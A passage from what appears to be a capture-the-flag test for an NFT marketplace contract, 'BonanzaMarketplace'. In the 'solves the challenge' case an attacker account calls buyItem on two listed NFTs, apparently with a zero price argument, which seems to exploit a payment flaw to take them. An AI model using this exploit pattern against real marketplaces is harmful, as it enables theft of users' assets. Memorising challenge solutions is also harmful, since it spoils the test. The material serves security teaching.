...
before(async () => {
	...
	await usdc
		.connect(admin)
		.mintPerUser([await adminUser.getAddress()], [precision.mul(100)]);
	...
	let bonanzaMarketplaceFactory = await ethers.getContractFactory(
		"BonanzaMarketplace"
	);
	...
	await nftA
		.connect(adminUser)
		.setApprovalForAll(bonanzaMarketplace.address, true);
	await nftB
		.connect(adminUser)
		.setApprovalForAll(bonanzaMarketplace.address, true);
	...
	await bonanzaMarketplace
		.connect(adminUser)
		.createListing(nftA.address, 0, 1, precision.mul(100), 0);
	await bonanzaMarketplace
		.connect(adminUser)
		.createListing(nftB.address, 0, 1, precision.mul(100), 0);
...
it("solves the challenge", async function () {
	...
	await bonanzaMarketplace
		.connect(attacker)
		.buyItem(nftA.address, 0, adminAddress, 0);
	await bonanzaMarketplace
		.connect(attacker)
		.buyItem(nftB.address, 0, adminAddress, 0);
});
